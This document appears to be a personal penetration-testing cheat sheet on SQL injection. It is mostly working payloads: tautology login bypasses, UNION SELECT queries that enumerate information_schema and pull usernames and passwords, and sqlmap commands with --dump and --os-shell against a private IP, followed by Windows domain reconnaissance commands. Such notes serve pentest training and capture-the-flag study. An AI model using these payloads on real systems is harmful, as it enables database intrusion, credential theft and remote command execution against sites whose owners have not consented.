SQL Injection

[*] Useful commands when he website is running a php server-side language and the PUT is "?id=VALUE".
	Indents should help with what is happening on the sql side.

	[*] MySQL syntax
		"1"
		"%"
		'
		1' or '0'='0
			mysql> SELECT first_name, last_name FROM users WHERE user_id = '1' or '0'='0';
		%' or '0'='0
			mysql> SELECT first_name, last_name FROM users WHERE user_id = '%' or '0'='0';
		%' or 0=0 union select null, version() -- -
			This will show the version of mysql. "-- -" or "#" can be used, both are comments.
		%' or 0=0 union select null, user() -- -
			Show the user running the SQL database.
		%' or 0=0 union select null, database() #
			This will reveal the database you are interacting with.

			MySQL has default databases built in. We can use these to find the users and other helpful tables:

			MariaDB [(none)]> show databases;                                                                      
			+--------------------+                                                                                 
			| Database           |                                                                                 
			+--------------------+                                                                                 
			| information_schema |                                                                                 
			| mysql              |                                                                                 
			| performance_schema |                                                                                 
			| wifi_access        |                                                                                 
			+--------------------+                                                                                 
			4 rows in set (0.00 sec)  

		%' and 1=0 union select null, table_name from information_schema.tables -- -
			This shows all of the tables in information_schema

		%' and 1=0 union select null, table_name from information_schema.tables where table_name like 'user%'#
			All tables that start with prefix "user" in the information_schema database.
		%' and 1=0 union select null, concat(table_name,0x0a,column_name) from information_schema.columns where table_name = 'users' -- -
			Display all columns for the "user" table within information_schema.
		%' and 1=0 union select null, concat(first_name,0x0a,last_name,0x0a,user,0x0a,password) from users -- -
			Show first and last name, user, and password.

[*] Known Fields To Test
	Login
		user: ' or '1'='1
		password: ' or '1'='1
	URL Parameters
		?id=1
		?id=1'
		?id=1' or '0'='0
		?id=2 or 1 in (SELECT DB_NAME(0))--
		?id=2 or 1=1--

[*] sqlmap
	sqlmap -u "http://192.168.122.236/bookservice/bookdetail.aspx?id=2" --dump
	sqlmap -u "http://192.168.122.236/bookservice/bookdetail.aspx?id=2" --os-shell
		whoami
		net users
		net groups "Domain Admins" /domain
		ipconfig


[*] Cheet Sheets
	https://portswigger.net/web-security/sql-injection/cheat-sheet
	https://portswigger.net/web-security/sql-injection/union-attacks

[*] Order of sql injection attacks
	Once an sql injection is found, start enumerating the tables:
	' ORDER BY 1 -- -
	' ORDER BY 2 -- -
	' ORDER BY 3 -- -
	And so on, then you can start pulling a union select between tables, this will help figure out string and int tables:
	' UNION SELECT NULL,NULL,NULL -- -
	' UNION SELECT 'a',NULL,NULL -- -
	' UNION SELECT NULL,3,NULL -- -
	Assuming you have access to the users table, you can try to read creds:
	' UNION SELECT CONCAT(username, ':', password) FROM users -- -
	' UNION SELECT NULL, username || ':' || password FROM users -- -
	' UNION SELECT CONCAT(username,':',password) FROM users -- -
	As part of enumeration, finding out version and database type is important:
		Database type	Query
		Microsoft, MySQL	SELECT @@version
		Oracle	SELECT * FROM v$version
		PostgreSQL	SELECT version()
			EXAMPLE: ' UNION SELECT @@version--